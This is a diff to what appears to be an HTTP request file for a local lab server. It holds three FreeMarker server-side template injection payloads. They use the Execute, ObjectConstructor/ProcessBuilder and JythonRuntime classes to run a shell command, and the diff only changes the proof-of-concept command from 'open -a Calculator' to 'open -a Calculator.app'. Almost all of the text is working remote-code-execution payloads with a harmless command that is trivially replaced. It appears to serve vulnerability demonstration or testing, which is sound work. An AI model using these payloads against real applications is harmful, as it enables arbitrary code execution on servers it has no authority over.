@@ -15,7 +15,7 @@ Host: 127.0.0.1:8080
 Content-Type: application/json
 
 {
-	"hello.ftl": "<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"open -a Calculator\")}"
+	"hello.ftl": "<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"open -a Calculator.app\")}"
 }
 
 
@@ -26,7 +26,7 @@ Host: 127.0.0.1:8080
 Content-Type: application/json
 
 {
-  "hello.ftl": "<#assign value=\"freemarker.template.utility.ObjectConstructor\"?new()>${value(\"java.lang.ProcessBuilder\",\"open\",\"-a\",\"Calculator\").start()}"
+  "hello.ftl": "<#assign value=\"freemarker.template.utility.ObjectConstructor\"?new()>${value(\"java.lang.ProcessBuilder\",\"open\",\"-a\",\"Calculator.app\").start()}"
 }
 
 ###
@@ -36,7 +36,7 @@ Host: 127.0.0.1:8080
 Content-Type: application/json
 
 {
-  "hello.ftl": "<#assign value=\"freemarker.template.utility.JythonRuntime\"?new()><@value>import os;os.system(\"open -a Calculator\")</@value>"
+  "hello.ftl": "<#assign value=\"freemarker.template.utility.JythonRuntime\"?new()><@value>import os;os.system(\"open -a Calculator.app\")</@value>"
 }
 
 
